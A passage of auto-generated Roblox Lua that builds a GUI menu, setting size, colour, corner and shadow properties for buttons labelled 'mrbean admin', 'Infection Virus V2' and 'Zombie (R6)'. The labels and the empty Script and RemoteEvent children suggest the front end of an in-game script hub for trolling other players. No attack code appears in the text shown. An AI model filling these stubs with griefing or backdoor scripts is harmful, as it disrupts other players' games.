G2L["251"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["251"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["251"].Active = false
G2L["251"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["251"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["251"].BackgroundTransparency = 1
G2L["251"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["251"].BorderSizePixel = 1
G2L["251"].ClipsDescendants = false
G2L["251"].Draggable = false
G2L["251"].Position = UDim2.new(0.5157791, 0, 0.48366833, 8)
G2L["251"].Rotation = 0
G2L["251"].Selectable = false
G2L["251"].SelectionOrder = 0
G2L["251"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["251"].Visible = true
G2L["251"].ZIndex = 1
G2L["251"].Parent = G2L["248"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.dev uzi.RemoteEvent
G2L["252"].Name = [[RemoteEvent]]
G2L["252"].Parent = G2L["243"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.dev uzi.Script
G2L["253"].Name = [[Script]]
G2L["253"].Parent = G2L["243"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.dev uzi.LocalScript
G2L["254"].Name = [[LocalScript]]
G2L["254"].Parent = G2L["243"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.mrbean admin
G2L["255"].Name = [[mrbean admin]]
G2L["255"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
G2L["255"].Text = [[mrbean admin]]
G2L["255"].TextColor3 = Color3.fromRGB(255, 255, 255)
G2L["255"].TextScaled = true
G2L["255"].TextSize = 14
G2L["255"].TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
G2L["255"].TextStrokeTransparency = 1
G2L["255"].TextWrapped = true
G2L["255"].TextXAlignment = Enum.TextXAlignment.Center
G2L["255"].TextYAlignment = Enum.TextYAlignment.Center
G2L["255"].Active = true
G2L["255"].AnchorPoint = Vector2.new(0, 0)
G2L["255"].BackgroundColor3 = Color3.fromRGB(200.00002, 0, 255)
G2L["255"].BackgroundTransparency = 0.5
G2L["255"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["255"].BorderSizePixel = 0
G2L["255"].ClipsDescendants = false
G2L["255"].Draggable = false
G2L["255"].Position = UDim2.new(0, 0, 0, 0)
G2L["255"].Rotation = 0
G2L["255"].Selectable = true
G2L["255"].SelectionOrder = 0
G2L["255"].Size = UDim2.new(0, 200, 0, 50)
G2L["255"].Visible = true
G2L["255"].ZIndex = 1
G2L["255"].Parent = G2L["5"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.mrbean admin.TextButton_Roundify_12px
G2L["256"].Name = [[TextButton_Roundify_12px]]
G2L["256"].Image = [[rbxassetid://3570695787]]
G2L["256"].ImageColor3 = Color3.fromRGB(255, 0, 0)
G2L["256"].ScaleType = Enum.ScaleType.Slice
G2L["256"].SliceCenter = Rect.new(100, 100, 100, 100)
G2L["256"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["256"].Active = true
G2L["256"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["256"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["256"].BackgroundTransparency = 1
G2L["256"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["256"].BorderSizePixel = 1
G2L["256"].ClipsDescendants = false
G2L["256"].Draggable = false
G2L["256"].Position = UDim2.new(0.5, 0, 0.5, 0)
G2L["256"].Rotation = 0
G2L["256"].Selectable = true
G2L["256"].SelectionOrder = 0
G2L["256"].Size = UDim2.new(1, 0, 1, 0)
G2L["256"].Visible = true
G2L["256"].ZIndex = 1
G2L["256"].Parent = G2L["255"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.mrbean admin.RippleClick
G2L["257"].Name = [[RippleClick]]
G2L["257"].Parent = G2L["255"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.mrbean admin.RippleClick.Circle
G2L["258"].Name = [[Circle]]
G2L["258"].Image = [[rbxassetid://266543268]]
G2L["258"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["258"].ScaleType = Enum.ScaleType.Stretch
G2L["258"].SliceCenter = Rect.new(0, 0, 0, 0)
G2L["258"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["258"].Active = false
G2L["258"].AnchorPoint = Vector2.new(0, 0)
G2L["258"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["258"].BackgroundTransparency = 1
G2L["258"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["258"].BorderSizePixel = 1
G2L["258"].ClipsDescendants = false
G2L["258"].Draggable = false
G2L["258"].Position = UDim2.new(0, 0, 0, 0)
G2L["258"].Rotation = 0
G2L["258"].Selectable = false
G2L["258"].SelectionOrder = 0
G2L["258"].Size = UDim2.new(0, 0, 0, 0)
G2L["258"].Visible = true
G2L["258"].ZIndex = 10
G2L["258"].Parent = G2L["257"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.mrbean admin.UICorner
G2L["259"].Name = [[UICorner]]
G2L["259"].CornerRadius = UDim.new(0, 10)
G2L["259"].Parent = G2L["255"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.mrbean admin.ServerEventHandler
G2L["260"].Name = [[ServerEventHandler]]
G2L["260"].Parent = G2L["255"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.mrbean admin.shadowHolder
G2L["261"].Name = [[shadowHolder]]
G2L["261"].Active = false
G2L["261"].AnchorPoint = Vector2.new(0, 0)
G2L["261"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["261"].BackgroundTransparency = 1
G2L["261"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["261"].BorderSizePixel = 1
G2L["261"].ClipsDescendants = false
G2L["261"].Draggable = false
G2L["261"].Position = UDim2.new(0, 0, 0, 0)
G2L["261"].Rotation = 0
G2L["261"].Selectable = false
G2L["261"].SelectionOrder = 0
G2L["261"].Size = UDim2.new(1, 0, 1, 0)
G2L["261"].Visible = true
G2L["261"].ZIndex = -1
G2L["261"].Parent = G2L["255"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.mrbean admin.shadowHolder.umbraShadow
G2L["262"].Name = [[umbraShadow]]
G2L["262"].Image = [[rbxassetid://1316045217]]
G2L["262"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["262"].ScaleType = Enum.ScaleType.Slice
G2L["262"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["262"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["262"].Active = false
G2L["262"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["262"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["262"].BackgroundTransparency = 1
G2L["262"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["262"].BorderSizePixel = 1
G2L["262"].ClipsDescendants = false
G2L["262"].Draggable = false
G2L["262"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["262"].Rotation = 0
G2L["262"].Selectable = false
G2L["262"].SelectionOrder = 0
G2L["262"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["262"].Visible = true
G2L["262"].ZIndex = 1
G2L["262"].Parent = G2L["261"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.mrbean admin.shadowHolder.penumbraShadow
G2L["263"].Name = [[penumbraShadow]]
G2L["263"].Image = [[rbxassetid://1316045217]]
G2L["263"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["263"].ScaleType = Enum.ScaleType.Slice
G2L["263"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["263"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["263"].Active = false
G2L["263"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["263"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["263"].BackgroundTransparency = 1
G2L["263"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["263"].BorderSizePixel = 1
G2L["263"].ClipsDescendants = false
G2L["263"].Draggable = false
G2L["263"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["263"].Rotation = 0
G2L["263"].Selectable = false
G2L["263"].SelectionOrder = 0
G2L["263"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["263"].Visible = true
G2L["263"].ZIndex = 1
G2L["263"].Parent = G2L["261"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.mrbean admin.shadowHolder.ambientShadow
G2L["264"].Name = [[ambientShadow]]
G2L["264"].Image = [[rbxassetid://1316045217]]
G2L["264"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["264"].ScaleType = Enum.ScaleType.Slice
G2L["264"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["264"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["264"].Active = false
G2L["264"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["264"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["264"].BackgroundTransparency = 1
G2L["264"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["264"].BorderSizePixel = 1
G2L["264"].ClipsDescendants = false
G2L["264"].Draggable = false
G2L["264"].Position = UDim2.new(0.5157791, 0, 0.48366833, 8)
G2L["264"].Rotation = 0
G2L["264"].Selectable = false
G2L["264"].SelectionOrder = 0
G2L["264"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["264"].Visible = true
G2L["264"].ZIndex = 1
G2L["264"].Parent = G2L["261"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Infection Virus V2
G2L["265"].Name = [[Infection Virus V2]]
G2L["265"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
G2L["265"].Text = [[Infection Virus V2]]
G2L["265"].TextColor3 = Color3.fromRGB(255, 255, 255)
G2L["265"].TextScaled = true
G2L["265"].TextSize = 14
G2L["265"].TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
G2L["265"].TextStrokeTransparency = 1
G2L["265"].TextWrapped = true
G2L["265"].TextXAlignment = Enum.TextXAlignment.Center
G2L["265"].TextYAlignment = Enum.TextYAlignment.Center
G2L["265"].Active = true
G2L["265"].AnchorPoint = Vector2.new(0, 0)
G2L["265"].BackgroundColor3 = Color3.fromRGB(200.00002, 0, 255)
G2L["265"].BackgroundTransparency = 0.5
G2L["265"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["265"].BorderSizePixel = 0
G2L["265"].ClipsDescendants = false
G2L["265"].Draggable = false
G2L["265"].Position = UDim2.new(0, 0, 0, 0)
G2L["265"].Rotation = 0
G2L["265"].Selectable = true
G2L["265"].SelectionOrder = 0
G2L["265"].Size = UDim2.new(0, 200, 0, 50)
G2L["265"].Visible = true
G2L["265"].ZIndex = 1
G2L["265"].Parent = G2L["5"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Infection Virus V2.TextButton_Roundify_12px
G2L["266"].Name = [[TextButton_Roundify_12px]]
G2L["266"].Image = [[rbxassetid://3570695787]]
G2L["266"].ImageColor3 = Color3.fromRGB(255, 0, 0)
G2L["266"].ScaleType = Enum.ScaleType.Slice
G2L["266"].SliceCenter = Rect.new(100, 100, 100, 100)
G2L["266"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["266"].Active = true
G2L["266"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["266"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["266"].BackgroundTransparency = 1
G2L["266"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["266"].BorderSizePixel = 1
G2L["266"].ClipsDescendants = false
G2L["266"].Draggable = false
G2L["266"].Position = UDim2.new(0.5, 0, 0.5, 0)
G2L["266"].Rotation = 0
G2L["266"].Selectable = true
G2L["266"].SelectionOrder = 0
G2L["266"].Size = UDim2.new(1, 0, 1, 0)
G2L["266"].Visible = true
G2L["266"].ZIndex = 1
G2L["266"].Parent = G2L["265"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Infection Virus V2.RippleClick
G2L["267"].Name = [[RippleClick]]
G2L["267"].Parent = G2L["265"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Infection Virus V2.RippleClick.Circle
G2L["268"].Name = [[Circle]]
G2L["268"].Image = [[rbxassetid://266543268]]
G2L["268"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["268"].ScaleType = Enum.ScaleType.Stretch
G2L["268"].SliceCenter = Rect.new(0, 0, 0, 0)
G2L["268"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["268"].Active = false
G2L["268"].AnchorPoint = Vector2.new(0, 0)
G2L["268"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["268"].BackgroundTransparency = 1
G2L["268"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["268"].BorderSizePixel = 1
G2L["268"].ClipsDescendants = false
G2L["268"].Draggable = false
G2L["268"].Position = UDim2.new(0, 0, 0, 0)
G2L["268"].Rotation = 0
G2L["268"].Selectable = false
G2L["268"].SelectionOrder = 0
G2L["268"].Size = UDim2.new(0, 0, 0, 0)
G2L["268"].Visible = true
G2L["268"].ZIndex = 10
G2L["268"].Parent = G2L["267"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Infection Virus V2.UICorner
G2L["269"].Name = [[UICorner]]
G2L["269"].CornerRadius = UDim.new(0, 10)
G2L["269"].Parent = G2L["265"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Infection Virus V2.shadowHolder
G2L["270"].Name = [[shadowHolder]]
G2L["270"].Active = false
G2L["270"].AnchorPoint = Vector2.new(0, 0)
G2L["270"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["270"].BackgroundTransparency = 1
G2L["270"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["270"].BorderSizePixel = 1
G2L["270"].ClipsDescendants = false
G2L["270"].Draggable = false
G2L["270"].Position = UDim2.new(0, 0, 0, 0)
G2L["270"].Rotation = 0
G2L["270"].Selectable = false
G2L["270"].SelectionOrder = 0
G2L["270"].Size = UDim2.new(1, 0, 1, 0)
G2L["270"].Visible = true
G2L["270"].ZIndex = -1
G2L["270"].Parent = G2L["265"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Infection Virus V2.shadowHolder.umbraShadow
G2L["271"].Name = [[umbraShadow]]
G2L["271"].Image = [[rbxassetid://1316045217]]
G2L["271"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["271"].ScaleType = Enum.ScaleType.Slice
G2L["271"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["271"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["271"].Active = false
G2L["271"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["271"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["271"].BackgroundTransparency = 1
G2L["271"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["271"].BorderSizePixel = 1
G2L["271"].ClipsDescendants = false
G2L["271"].Draggable = false
G2L["271"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["271"].Rotation = 0
G2L["271"].Selectable = false
G2L["271"].SelectionOrder = 0
G2L["271"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["271"].Visible = true
G2L["271"].ZIndex = 1
G2L["271"].Parent = G2L["270"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Infection Virus V2.shadowHolder.penumbraShadow
G2L["272"].Name = [[penumbraShadow]]
G2L["272"].Image = [[rbxassetid://1316045217]]
G2L["272"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["272"].ScaleType = Enum.ScaleType.Slice
G2L["272"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["272"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["272"].Active = false
G2L["272"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["272"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["272"].BackgroundTransparency = 1
G2L["272"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["272"].BorderSizePixel = 1
G2L["272"].ClipsDescendants = false
G2L["272"].Draggable = false
G2L["272"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["272"].Rotation = 0
G2L["272"].Selectable = false
G2L["272"].SelectionOrder = 0
G2L["272"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["272"].Visible = true
G2L["272"].ZIndex = 1
G2L["272"].Parent = G2L["270"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Infection Virus V2.shadowHolder.ambientShadow
G2L["273"].Name = [[ambientShadow]]
G2L["273"].Image = [[rbxassetid://1316045217]]
G2L["273"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["273"].ScaleType = Enum.ScaleType.Slice
G2L["273"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["273"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["273"].Active = false
G2L["273"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["273"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["273"].BackgroundTransparency = 1
G2L["273"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["273"].BorderSizePixel = 1
G2L["273"].ClipsDescendants = false
G2L["273"].Draggable = false
G2L["273"].Position = UDim2.new(0.5157791, 0, 0.48366833, 8)
G2L["273"].Rotation = 0
G2L["273"].Selectable = false
G2L["273"].SelectionOrder = 0
G2L["273"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["273"].Visible = true
G2L["273"].ZIndex = 1
G2L["273"].Parent = G2L["270"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Infection Virus V2.RemoteEvent
G2L["274"].Name = [[RemoteEvent]]
G2L["274"].Parent = G2L["265"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Infection Virus V2.Script
G2L["275"].Name = [[Script]]
G2L["275"].Parent = G2L["265"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Infection Virus V2.LocalScript
G2L["276"].Name = [[LocalScript]]
G2L["276"].Parent = G2L["265"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.TextButton
G2L["277"].Name = [[TextButton]]
G2L["277"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
G2L["277"].Text = [[Zombie (R6)]]
G2L["277"].TextColor3 = Color3.fromRGB(255, 255, 255)
G2L["277"].TextScaled = true
G2L["277"].TextSize = 14
G2L["277"].TextStrokeColor3 = Color3.fromRGB(255, 240.00002, 240.00002)
G2L["277"].TextStrokeTransparency = 1
G2L["277"].TextWrapped = true
G2L["277"].TextXAlignment = Enum.TextXAlignment.Center
G2L["277"].TextYAlignment = Enum.TextYAlignment.Center
G2L["277"].Active = true
G2L["277"].AnchorPoint = Vector2.new(0, 0)
G2L["277"].BackgroundColor3 = Color3.fromRGB(200.00002, 0, 255)
G2L["277"].BackgroundTransparency = 0.5
G2L["277"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["277"].BorderSizePixel = 1
G2L["277"].ClipsDescendants = false
G2L["277"].Draggable = false
G2L["277"].Position = UDim2.new(0.19214876, 0, -0.016759777, 0)
G2L["277"].Rotation = 0
G2L["277"].Selectable = true
G2L["277"].SelectionOrder = 0
G2L["277"].Size = UDim2.new(0, 100, 0, 67)
G2L["277"].Visible = true
G2L["277"].ZIndex = 1
G2L["277"].Parent = G2L["5"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.TextButton.UICorner
G2L["278"].Name = [[UICorner]]
G2L["278"].CornerRadius = UDim.new(0, 8)
G2L["278"].Parent = G2L["277"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.TextButton.Script
G2L["279"].Name = [[Script]]
G2L["279"].Parent = G2L["277"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.TextButton.shadowHolder
G2L["280"].Name = [[shadowHolder]]
G2L["280"].Active = false
G2L["280"].AnchorPoint = Vector2.new(0, 0)
G2L["280"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["280"].BackgroundTransparency = 1
G2L["280"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["280"].BorderSizePixel = 1
G2L["280"].ClipsDescendants = false
G2L["280"].Draggable = false
G2L["280"].Position = UDim2.new(0, 0, 0, 0)
G2L["280"].Rotation = 0
G2L["280"].Selectable = false
G2L["280"].SelectionOrder = 0
G2L["280"].Size = UDim2.new(1, 0, 1, 0)
G2L["280"].Visible = true
G2L["280"].ZIndex = -1
G2L["280"].Parent = G2L["277"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.TextButton.shadowHolder.umbraShadow
G2L["281"].Name = [[umbraShadow]]
G2L["281"].Image = [[rbxassetid://1316045217]]
G2L["281"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["281"].ScaleType = Enum.ScaleType.Slice
G2L["281"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["281"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["281"].Active = false
G2L["281"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["281"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["281"].BackgroundTransparency = 1
G2L["281"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["281"].BorderSizePixel = 1
G2L["281"].ClipsDescendants = false
G2L["281"].Draggable = false
G2L["281"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["281"].Rotation = 0
G2L["281"].Selectable = false
G2L["281"].SelectionOrder = 0
G2L["281"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["281"].Visible = true
G2L["281"].ZIndex = 1
G2L["281"].Parent = G2L["280"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.TextButton.shadowHolder.penumbraShadow
G2L["282"].Name = [[penumbraShadow]]
G2L["282"].Image = [[rbxassetid://1316045217]]
G2L["282"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["282"].ScaleType = Enum.ScaleType.Slice
G2L["282"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["282"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["282"].Active = false
G2L["282"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["282"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["282"].BackgroundTransparency = 1
G2L["282"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["282"].BorderSizePixel = 1
G2L["282"].ClipsDescendants = false
G2L["282"].Draggable = false
G2L["282"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["282"].Rotation = 0
G2L["282"].Selectable = false
G2L["282"].SelectionOrder = 0
G2L["282"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["282"].Visible = true
G2L["282"].ZIndex = 1
G2L["282"].Parent = G2L["280"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.TextButton.shadowHolder.ambientShadow
G2L["283"].Name = [[ambientShadow]]
G2L["283"].Image = [[rbxassetid://1316045217]]
G2L["283"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["283"].ScaleType = Enum.ScaleType.Slice
G2L["283"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["283"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["283"].Active = false
G2L["283"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["283"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["283"].BackgroundTransparency = 1
G2L["283"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["283"].BorderSizePixel = 1
G2L["283"].ClipsDescendants = false
G2L["283"].Draggable = false
G2L["283"].Position = UDim2.new(0.5157791, 0, 0.48366833, 8)
G2L["283"].Rotation = 0
G2L["283"].Selectable = false
G2L["283"].SelectionOrder = 0
G2L["283"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["283"].Visible = true
G2L["283"].ZIndex = 1
G2L["283"].Parent = G2L["280"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.TextButton.TextButton_Roundify_12px
G2L["284"].Name = [[TextButton_Roundify_12px]]
G2L["284"].Image = [[rbxassetid://3570695787]]
G2L["284"].ImageColor3 = Color3.fromRGB(255, 0, 0)
G2L["284"].ScaleType = Enum.ScaleType.Slice
G2L["284"].SliceCenter = Rect.new(100, 100, 100, 100)
G2L["284"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["284"].Active = true
G2L["284"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["284"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["284"].BackgroundTransparency = 1
G2L["284"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["284"].BorderSizePixel = 1
G2L["284"].ClipsDescendants = false
G2L["284"].Draggable = false
G2L["284"].Position = UDim2.new(0.5, 0, 0.5, 0)
G2L["284"].Rotation = 0
G2L["284"].Selectable = true
G2L["284"].SelectionOrder = 0
G2L["284"].Size = UDim2.new(1, 0, 1, 0)
G2L["284"].Visible = true
G2L["284"].ZIndex = 1
G2L["284"].Parent = G2L["277"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.nothing here yet
G2L["285"].Name = [[nothing here yet]]
G2L["285"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
G2L["285"].Text = [[nothing here yet]]
G2L["285"].TextColor3 = Color3.fromRGB(255, 255, 255)
G2L["285"].TextScaled = true
G2L["285"].TextSize = 14
G2L["285"].TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
G2L["285"].TextStrokeTransparency = 1
G2L["285"].TextWrapped = true
G2L["285"].TextXAlignment = Enum.TextXAlignment.Center
G2L["285"].TextYAlignment = Enum.TextYAlignment.Center
G2L["285"].Active = true
G2L["285"].AnchorPoint = Vector2.new(0, 0)
G2L["285"].BackgroundColor3 = Color3.fromRGB(200.00002, 0, 255)
G2L["285"].BackgroundTransparency = 0.5
G2L["285"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["285"].BorderSizePixel = 0
G2L["285"].ClipsDescendants = false
G2L["285"].Draggable = false
G2L["285"].Position = UDim2.new(0, 0, 0, 0)
G2L["285"].Rotation = 0
G2L["285"].Selectable = true
G2L["285"].SelectionOrder = 0
G2L["285"].Size = UDim2.new(0, 200, 0, 50)
G2L["285"].Visible = true
G2L["285"].ZIndex = 1
G2L["285"].Parent = G2L["5"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.nothing here yet.RippleClick
G2L["286"].Name = [[RippleClick]]
G2L["286"].Parent = G2L["285"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.nothing here yet.RippleClick.Circle
G2L["287"].Name = [[Circle]]
G2L["287"].Image = [[rbxassetid://266543268]]
G2L["287"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["287"].ScaleType = Enum.ScaleType.Stretch
G2L["287"].SliceCenter = Rect.new(0, 0, 0, 0)
G2L["287"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["287"].Active = false
G2L["287"].AnchorPoint = Vector2.new(0, 0)
G2L["287"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["287"].BackgroundTransparency = 1
G2L["287"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["287"].BorderSizePixel = 1
G2L["287"].ClipsDescendants = false
G2L["287"].Draggable = false
G2L["287"].Position = UDim2.new(0, 0, 0, 0)
G2L["287"].Rotation = 0
G2L["287"].Selectable = false
G2L["287"].SelectionOrder = 0
G2L["287"].Size = UDim2.new(0, 0, 0, 0)
G2L["287"].Visible = true
G2L["287"].ZIndex = 10
G2L["287"].Parent = G2L["286"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.nothing here yet.shadowHolder
G2L["288"].Name = [[shadowHolder]]
G2L["288"].Active = false
G2L["288"].AnchorPoint = Vector2.new(0, 0)
G2L["288"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["288"].BackgroundTransparency = 1
G2L["288"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["288"].BorderSizePixel = 1
G2L["288"].ClipsDescendants = false
G2L["288"].Draggable = false
G2L["288"].Position = UDim2.new(0, 0, 0, 0)
G2L["288"].Rotation = 0
G2L["288"].Selectable = false
G2L["288"].SelectionOrder = 0
G2L["288"].Size = UDim2.new(1, 0, 1, 0)
G2L["288"].Visible = true
G2L["288"].ZIndex = -1
G2L["288"].Parent = G2L["285"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.nothing here yet.shadowHolder.umbraShadow
G2L["289"].Name = [[umbraShadow]]
G2L["289"].Image = [[rbxassetid://1316045217]]
G2L["289"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["289"].ScaleType = Enum.ScaleType.Slice
G2L["289"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["289"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["289"].Active = false
